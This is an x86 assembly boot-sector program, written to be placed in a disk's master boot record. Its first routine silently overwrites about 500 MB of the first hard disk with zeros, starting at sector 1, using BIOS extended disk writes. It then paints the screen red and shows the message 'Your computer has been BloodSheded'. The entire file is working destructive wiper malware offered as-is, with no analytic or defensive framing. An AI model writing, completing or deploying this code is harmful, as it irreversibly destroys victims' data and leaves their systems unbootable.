[BITS 16]
[ORG 0x7C00]

start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti

    ; ══════════════════════════════════════════════════
    ;  WIPE 500MB FROM SECTOR 1 (SILENT)
    ; ══════════════════════════════════════════════════
    mov dl, 0x80
    mov [disknum], dl

    push es
    mov ax, 0x8000
    mov es, ax
    xor di, di
    xor al, al
    mov cx, 8192
    rep stosb
    pop es

    mov dword [lba_current], 1

wipe_loop:
    mov eax, [lba_current]
    cmp eax, 0x000FA000
    jae wipe_done

    mov di, disk_packet
    mov eax, [lba_current]
    mov [di + 8], eax
    xor eax, eax
    mov [di + 12], eax
    mov word [di + 2], 64
    mov word [di + 4], 0x8000
    mov word [di + 6], 0x0000

    mov ah, 0x43
    mov al, 0x00
    mov dl, [disknum]
    mov si, disk_packet
    int 0x13

    add dword [lba_current], 64
    jmp wipe_loop

wipe_done:
    ; ══════════════════════════════════════════════════
    ;  RED SCREEN VIA DIRECT VRAM (no cell borders)
    ; ══════════════════════════════════════════════════
    mov ax, 0x0003
    int 0x10

    mov ax, 0xB800
    mov es, ax
    xor di, di
    mov cx, 80*25
    mov ah, 0x40
.fill:
    mov al, ' '
    stosw
    loop .fill

    ; ══════════════════════════════════════════════════
    ;  BLACK TEXT ON RED VIA TELETYPE
    ; ══════════════════════════════════════════════════
    mov si, message
.print:
    lodsb
    cmp al, 0
    je .halt
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x40
    int 0x10
    jmp .print
.halt:
    hlt
    jmp .halt

message: db 'Your computer has been BloodSheded', 0

disk_packet:
    db 0x10
    db 0
    dw 64
    dw 0x8000
    dw 0x0000
    dd 0
    dd 0

disknum:     db 0
lba_current: dd 0

times 510-($-$$) db 0
dw 0xAA55
